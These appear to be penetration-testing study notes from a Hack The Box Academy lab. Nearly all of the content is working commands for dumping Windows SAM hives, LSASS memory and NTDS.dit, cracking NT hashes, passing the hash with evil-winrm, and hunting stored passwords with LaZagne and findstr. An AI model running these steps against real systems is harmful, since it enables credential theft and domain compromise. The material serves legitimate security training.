## Attacking SAM
```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```
Technically we will only need `hklm\sam` & `hklm\system`, but `hklm\security` can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts.
```shell-session
Orbixio@htb[/htb]$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
==Cracking NT Hashes==
```shell-session
Orbixio@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```
Refrence: https://hashcat.net/wiki/doku.php?id=example_hashes
==Remote Dumping==
```shell-session
Orbixio@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
Orbixio@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
## Attacking LSASS

==Task Manager Method==
With access to an interactive graphical session with the target, we can use task manager to create a memory dump. This requires us to:

![Task Manager Memory Dump](https://academy.hackthebox.com/storage/modules/147/taskmanagerdump.png)

`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`
```cmd-session
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```
==Rundll32.exe & Comsvcs.dll Method==
```cmd-session
C:\Windows\system32> tasklist /svc
PS C:\Windows\system32> Get-Process lsass

PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`).
==Dumping & Cracking==
Once we have the dump file on our attack host, we can use a powerful tool called [pypykatz](https://github.com/skelsec/pypykatz) to attempt to extract credentials from the .dmp file. Pypykatz is an implementation of Mimikatz written entirely in Python.
```shell-session
Orbixio@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 


Orbixio@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
## Attacking Active Directory & NTDS.dit
```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
Transfer the file `C:\NTDS\NTDS.dit` to attacker host via any method.
==Alternative via CrackMapExec==
```shell-session
Orbixio@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```
==Cracking==
```shell-session
Orbixio@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
==PassTheHash==
```shell-session
Orbixio@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```
## Credential Hunting in Windows
Here are some helpful key terms we can use that can help us discover some credentials:
1. Passwords
2. Passphrases
3. Keys
4. Username
5. User account
6. Credentials
7. Users
8. Passkeys
9. Passphrases
10. Configuration
11. DB credentials
12. DB password
13. Pwd
14. Login
15. Credentials
We can also take advantage of third-party tools like [Lazagne](https://github.com/AlessandroZ/LaZagne) to quickly discover credentials that web browsers or other installed applications may insecurely store.
```cmd-session
C:\Users\bob\Desktop> start lazagne.exe all

C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```
Here are some other places we should keep in mind when credential hunting:

- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share
- Password in scripts on IT shares
- Passwords in web.config files on dev machines and IT shares
- unattend.xml
- Passwords in the AD user or computer description fields
- KeePass databases --> pull hash, crack and get loads of access.
- Found on user systems and shares
- Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)